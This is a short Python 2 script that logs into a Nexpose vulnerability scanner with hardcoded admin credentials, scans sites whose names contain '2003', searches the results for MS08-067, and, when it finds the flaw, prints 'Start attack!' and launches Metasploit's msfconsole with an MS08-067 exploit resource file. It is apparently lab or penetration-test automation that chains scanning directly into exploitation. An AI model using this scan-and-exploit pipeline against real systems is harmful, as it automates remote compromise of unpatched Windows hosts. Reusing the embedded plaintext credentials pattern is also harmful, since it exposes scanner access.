import pnexpose
import os
import time
import base64

serveraddr = '202.100.1.213'
port = 3780
username = 'nxadmin'
password = 'Cisc0123'

#creates a nexposeClient object
nexposeClient = pnexpose.Connection(serveraddr, port, username, password)

#call requires site ids in an array
#sites = [1,2]

query = """SELECT fa.vulnerability_instances, fa.affected_assets, fa.most_recently_discovered, dv.title 
         FROM fact_vulnerability fa 
         JOIN dim_vulnerability dv USING (vulnerability_id) 
         where affected_assets > 0"""

#response = nexposeClient.adhoc_report(query,sites)
#print response

#response = nexposeClient.vulnerability_listing()
#print response

#response = nexposeClient.site_device_listing(2)
#print response

print '-----------------list siteID and siteName----------------'
print 'siteID           siteName'

sitelist = nexposeClient.list_sites()
for site in sitelist:
    print '%s                %s' % (site[1], site[2])
print '---------------------------------------------------------'
print '---------------------------------------------------------'
print '---------------------------------------------------------'

t = 0
for site in sitelist:
    if '2003' in site[2]:
        print '------------Scanning Vulnerabilities for %s -----------' % site[2]
        scanID = nexposeClient.site_scan(site[1])
        while True:
            t = t + 5
            scanStatus = nexposeClient.scan_status(scanID)
            if "finished" in scanStatus:
                print '------------Scan Finished------------'
                print '------------Find MS08-067 for %s -----------' % site[2]
                response = nexposeClient.adhoc_report(query, site[1])
                if 'MS08-067' in response:
                    print 'Found MS08-067! Found MS08-067! Found MS08-067! Found MS08-067! Found MS08-067! Found MS08-067!'
                    print 'Start attack! Start attack! Start attack! Start attack! Start attack! Start attack! '
                    os.system('msfconsole -r /usr/share/metasploit-framework/scripts/resource/ms08067.rc')
                    break
                else:
                    print 'MS08-067 not found! MS08-067 not found! MS08-067 not found! MS08-067 not found! MS08-067 not found!'
            if t%60 == 0:
                print '......................running scan %s minutes..................... ' % (t/60)
            time.sleep(5)
    else: continue